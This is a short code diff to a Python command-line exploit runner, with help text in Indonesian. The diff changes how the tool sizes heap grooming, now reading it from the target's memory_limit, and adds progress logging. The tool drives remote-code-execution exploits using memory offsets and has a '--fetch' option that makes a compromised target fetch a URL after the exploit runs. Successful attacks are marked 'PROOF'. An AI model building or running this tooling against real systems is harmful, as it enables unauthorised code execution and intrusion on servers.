@@ -217,7 +217,8 @@ def _add_exploit_flags(p: argparse.ArgumentParser, single: bool) -> None:
     g.add_argument("--exploit-profile", choices=("lab", "bookworm"), default=None,
                    help="profil offset exploit.py (BUKAN sidik jari TLS)")
     g.add_argument("--huge-mb", type=int, default=None,
-                   help="ukuran heap grooming MB (default upstream 12)")
+                   help="paksa ukuran field 'big' (MB); default: dibaca otomatis "
+                        "dari memory_limit target")
     g.add_argument("--fetch", default=None,
                    help="URL yang di-fetch lewat RCE setelah eksekusi")
     g.add_argument("--retries", type=int, default=None,
@@ -350,7 +351,7 @@ def _run_exploits(candidates: list[dict], args) -> None:
             zif_offset=args.zif_offset,
             dtor_offset=args.dtor_offset,
             htdata_offset=args.htdata_offset,
-            huge_mb=args.huge_mb or 12,
+            huge_mb=args.huge_mb,
             retries=args.retries or 3,
             no_pre_rotate=args.no_pre_rotate,
             no_retry_rotate=args.no_retry_rotate,
@@ -358,6 +359,7 @@ def _run_exploits(candidates: list[dict], args) -> None:
             timeout=args.timeout or 15.0,
             max_total_timeout=args.exploit_timeout,
             quiet=not args.verbose,
+            log=(lambda m: print(f"     {m}", flush=True)),
         )
         r["exploit"] = res.as_dict()
         tag = "PROOF" if res.success else "gagal"
